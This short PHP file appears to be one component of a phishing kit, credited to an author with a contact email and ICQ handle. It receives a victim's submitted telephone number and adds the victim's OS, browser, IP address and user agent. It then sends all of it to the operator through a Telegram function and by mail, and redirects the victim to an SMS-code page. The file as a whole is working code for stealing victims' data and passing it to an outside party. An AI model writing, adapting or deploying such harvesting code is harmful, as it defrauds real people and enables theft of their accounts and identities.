<?php


/*

Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/
if(isset($_POST['tel'])){
	
include "../config.php";
include "funcs.php";

$tel =  $_POST['tel'];

$message = "\n📋 Telephone: $tel\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);

$subject = "🔔 N° Tel |  $ip";

mail($email,$subject,$message);


echo "<meta http-equiv=\"Refresh\" content=\"0; url=../sms.php\" />";



}
?>